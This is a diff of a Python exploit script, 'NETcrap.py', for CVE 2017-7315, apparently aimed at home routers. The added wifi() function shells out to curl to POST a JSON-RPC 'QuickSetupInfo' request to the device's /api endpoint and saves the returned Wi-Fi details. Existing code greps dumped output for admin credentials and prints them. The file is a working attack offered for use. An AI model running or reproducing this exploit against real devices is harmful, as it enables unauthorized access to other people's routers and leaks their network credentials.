@@ -1,7 +1,7 @@
 #!/usr/bin/python
-# Exploit: CVE 2017-7315 (got by Gambler [br huehue])
+# Exploit: CVE 2017-7315
 # Date: 12 July 2017
-# Exploit Script Author: Carlos Neri Correia
+# Exploit Author: Carlos Neri Correia
 # Author Contact: hackerama@protonmail.com
 
 import subprocess
@@ -22,6 +22,7 @@ def convert(gateway):
 				return url
 
 def encontre(word):
+	
     arq = open('wifi.txt', 'r').readlines()
     for item in arq:
         if item.rfind(word) != -1:
@@ -30,8 +31,13 @@ def encontre(word):
                 continue
             else:
                 return trato
-                				
+def wifi():
+	comando = 'curl -X POST -s -H \'Content-Type: application/x-www-form-urlencoded charset=UTF-8\' -d \'{\"method\":\"QuickSetupInfo\",\"id\":90,\"jsonrpc":\"2.0\"}\' http://192.168.0.1/api'
+	execu = subprocess.Popen([comando], shell=True, stdout=subprocess.PIPE).communicate()[0]
+	arq = open('wifi.txt', 'w').write(execu)             				
+
 def usage():
+
 	return """
 USAGE:  python NETcrap.py [GATEWAY]
 		
@@ -72,6 +78,7 @@ try:
 	open('saida.txt', 'w').write(output)
 	
 	extract = subprocess.Popen(["strings saida.txt | grep -A 1 admin"], shell=True,stdout=subprocess.PIPE).communicate()[0].split('\n')
+	wifi()	
 	print '[NETcrap] - Credenciais de acesso encontradas.\n'
 	print 'INFOS DO MODEM:'
 	print '---------------'
@@ -87,3 +94,14 @@ try:
 	print '[NETcrap] - Outras informacoes interessantes foram salvas no arquivo wifi.txt.\n'
 except:
 	pass
+
+def encontre(word):
+    arq = open('wifi.txt', 'r').readlines()
+    for item in arq:
+        if item.rfind(word) != -1:
+            trato = item.strip(' ')
+            if trato.startswith('"ssid" : "#'):
+                continue
+            else:
+                return trato
+
